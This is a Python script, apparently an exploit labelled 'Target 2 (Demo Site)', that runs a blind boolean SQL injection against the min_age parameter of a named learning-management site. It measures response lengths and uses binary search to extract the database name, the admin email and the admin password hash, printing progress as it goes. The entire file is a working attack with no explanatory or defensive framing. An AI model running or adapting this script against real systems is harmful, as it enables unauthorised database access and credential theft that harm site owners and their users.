import requests
import time
import sys

# Target configuration for Target 2 (Demo Site)
TARGET = "https://lms.rocket-soft.org/instructor-finder"
PARAM = "min_age"

def get_response_length(payload, retries=3):
    """Send request with SQL payload and return response length with retry logic."""
    params = {PARAM: payload}
    for i in range(retries):
        try:
            # Short timeout to avoid hanging, combined with retries
            response = requests.get(TARGET, params=params, timeout=10)
            return len(response.text)
        except Exception as e:
            if i == retries - 1:
                return 0
            time.sleep(1)
    return 0

def calibrate():
    """Determine the threshold for TRUE/FALSE conditions."""
    print("[*] Calibrating SQLi conditions...")
    len_true = get_response_length("1 AND (1=1)")
    len_false = get_response_length("1 AND (1=2)")
    
    if len_true == 0 or len_false == 0:
        print("[-] Calibration failed: Connection issues.")
        sys.exit(1)
        
    print(f"    TRUE length: {len_true}")
    print(f"    FALSE length: {len_false}")
    
    threshold = (len_true + len_false) // 2
    is_true_longer = len_true > len_false
    print(f"[+] Threshold: {threshold} (TRUE is {'longer' if is_true_longer else 'shorter'})")
    return threshold, is_true_longer

def check_condition(condition, threshold, is_true_longer):
    """Check if a SQL condition is TRUE or FALSE based on response length."""
    payload = f"1 AND ({condition})"
    length = get_response_length(payload)
    if is_true_longer:
        return length > threshold
    else:
        return length < threshold

def extract_char_binary(query, pos, threshold, is_true_longer):
    """Extract a single character's ASCII value using binary search."""
    low = 32
    high = 126
    char_code = 0
    
    while low <= high:
        mid = (low + high) // 2
        condition = f"ORD(SUBSTRING(({query}),{pos},1)) > {mid}"
        if check_condition(condition, threshold, is_true_longer):
            low = mid + 1
            char_code = low
        else:
            high = mid - 1
            char_code = mid
            
    return chr(char_code) if char_code > 0 else None

def extract_string(query, threshold, is_true_longer, label="Data", max_len=100):
    """Extract a full string using binary search for each character."""
    print(f"[*] Extracting {label}...")
    result = ""
    for pos in range(1, max_len + 1):
        char = extract_char_binary(query, pos, threshold, is_true_longer)
        
        # Check if we hit the end of the string (null or non-printable)
        if not char or ord(char) <= 32 and pos > 1: # Basic end condition
            # Double check if it's really the end by check if length is reached
            if not check_condition(f"ORD(SUBSTRING(({query}),{pos},1)) > 0", threshold, is_true_longer):
                break
        
        result += char
        print(f"\r[+] {label}: {result}", end="", flush=True)
    print()
    return result

def main():
    print("=" * 60)
    print("SQL Injection Exploit - Target 2 (Binary Search Mode)")
    print("Target: " + TARGET)
    print("=" * 60)
    
    threshold, is_true_longer = calibrate()
    
    # 1. Database name
    extract_string("SELECT database()", threshold, is_true_longer, "DB Name")
    
    # 2. Admin Email (assuming ID 1)
    extract_string("SELECT email FROM users WHERE id=1", threshold, is_true_longer, "Admin Email")
    
    # 3. Admin Password Hash
    extract_string("SELECT password FROM users WHERE id=1", threshold, is_true_longer, "Admin Hash", max_len=60)

    print("\n" + "=" * 60)
    print("Exploitation Complete.")
    print("=" * 60)

if __name__ == "__main__":
    main()
